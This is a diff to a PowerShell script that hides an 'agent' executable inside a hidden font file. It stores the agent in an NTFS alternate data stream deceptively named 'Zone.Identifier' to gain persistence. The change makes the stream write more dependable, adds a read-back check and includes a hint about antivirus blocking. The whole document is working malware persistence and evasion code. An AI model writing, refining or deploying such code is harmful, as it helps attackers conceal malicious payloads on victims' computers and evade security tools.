@@ -34,41 +34,35 @@ New-Item -ItemType File -Path $fontFile -Force | Out-Null
 attrib +h $fontFile
 Write-Output "[+] Created fresh font file: $fontFile"
 
-# --- 2. Write agent to ADS (reliable method) ---
+# --- 2. Write agent to ADS (bulletproof) ---
 $streamName = "Zone.Identifier"
-$fullStreamPath = "$fontFile`:$streamName"
+
+# Ensure file is not read-only
+Set-ItemProperty -Path $fontFile -Name IsReadOnly -Value $false -Force -ErrorAction SilentlyContinue
+
+Write-Output "[*] Writing agent to ADS using Set-Content -Stream..."
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -Force
 
-$adsWritten = $false
-try {
-    # Method 1: .NET WriteAllBytes (fast, works if path format is correct)
-    [System.IO.File]::WriteAllBytes($fullStreamPath, $agentBytes)
-    Write-Output "[+] Agent embedded into ADS via WriteAllBytes."
-    $adsWritten = $true
-} catch {
-    Write-Output "[-] WriteAllBytes failed: $_"
-    # Method 2: PowerShell Set-Content with -Stream (fallback, always reliable)
-    try {
-        Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -Force
-        Write-Output "[+] Agent embedded via Set-Content fallback."
-        $adsWritten = $true
-    } catch {
-        Write-Output "[-] Fallback also failed: $_"
-    }
-}
+# Give the file system a moment to register the stream
+Start-Sleep -Milliseconds 500
 
-if (-not $adsWritten) {
-    Write-Output "❌ Failed to write ADS. Exiting."
-    exit
-}
-
-# Verify ADS
+# Verify the stream exists
 $streams = Get-Item $fontFile -Stream * -ErrorAction SilentlyContinue
 if ($streams.Name -contains $streamName) {
     $size = (Get-Item $fontFile -Stream $streamName).Length
     Write-Output "[+] Verified: ADS '$streamName' exists (size: $size bytes)."
+    # Double-check by reading back a few bytes
+    $testRead = Get-Content -Path $fontFile -Stream $streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+    if ($testRead) {
+        Write-Output "[+] Read test successful."
+    } else {
+        Write-Output "[-] Read test failed. Stream may be corrupted."
+        exit
+    }
 } else {
-    Write-Output "[-] ADS not found after write attempts. Persistence will fail."
+    Write-Output "[-] ADS not found after write. Persistence will fail."
+    Write-Output "    Check: Drive must be NTFS, file not locked, antivirus not blocking."
     exit
 }
 
